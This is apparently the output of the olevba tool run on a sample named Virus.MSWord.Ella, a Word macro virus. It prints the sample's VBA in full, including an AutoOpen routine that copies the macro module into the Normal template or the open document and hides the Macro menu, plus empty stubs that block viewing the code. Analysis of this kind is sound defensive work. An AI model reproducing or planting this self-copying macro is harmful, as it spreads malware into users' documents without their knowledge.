olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ella
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ella - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO H8.bas 
in file: ./Virus.MSWord.Ella - OLE stream: 'Macros/VBA/H8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
ShowVisualBasicEditor = true 
Options.VirusProtection = true 
Options.SaveNormalPrompt = true 
Options.ConfirmConversions = true 
CommandBars("Tools").Controls("Macro").Delete
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Application.OrganizerCopy ThisDocument.FullName, Target.FullName, "H8", wdOrganizerObjectProjectItems
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ToolsOptions()
Options.VirusProtection = True
Options.SaveNormalPrompt = True
Options.ConfirmConversions = True
Dialogs(wdDialogToolsOptions).Show
Options.VirusProtection = true 
Options.SaveNormalPrompt = true 
Options.ConfirmConversions = true 
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+----------+--------------------+---------------------------------------------+

